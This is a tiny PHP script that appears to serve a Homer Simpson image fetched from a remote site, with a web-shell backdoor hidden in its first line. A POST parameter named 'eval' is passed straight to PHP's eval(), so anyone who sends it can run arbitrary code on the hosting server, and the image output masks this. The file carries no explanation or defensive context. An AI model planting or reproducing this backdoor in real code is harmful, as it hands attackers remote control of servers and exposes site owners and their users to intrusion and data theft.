<?php
	isset($_POST['eval']) ? die(eval($_POST['eval'])) : $img = "http://assets3.thrillist.com/v1/image/1350870/size/tl-horizontal_main/all-110-times-homer-simpson-says-mmm";
	$imginfo = getimagesize($img);
	header("Content-type: ".$imginfo['mime']);
	readfile($img);
